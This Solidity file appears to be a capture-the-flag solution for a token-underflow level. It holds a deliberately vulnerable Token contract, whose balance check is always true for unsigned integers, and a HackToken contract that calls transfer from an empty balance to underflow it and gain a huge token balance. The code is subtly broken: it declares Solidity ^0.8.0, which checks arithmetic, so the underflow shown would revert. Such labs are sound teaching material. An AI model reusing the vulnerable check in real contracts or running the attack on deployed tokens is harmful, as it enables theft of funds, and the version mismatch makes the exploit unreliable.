// SPDX-License: UNLICENSED
pragma solidity ^0.8.0;
/*
The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you 
somehow manage to get your hands on any additional tokens. 
Preferably a very large amount of tokens.

Things that might help: 
    What is an odometer?
*/

// Perform overflows and underflows 
// no safe math checks
// 0 - 1 will underflow

contract HackToken {
    Token private immutable target;

    constructor(address _target) {
        target = Token(_target);
    }

    function underflow() external {
        // cause underflow
        target.transfer(msg.sender, 1);
    }
}


contract Token {

    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}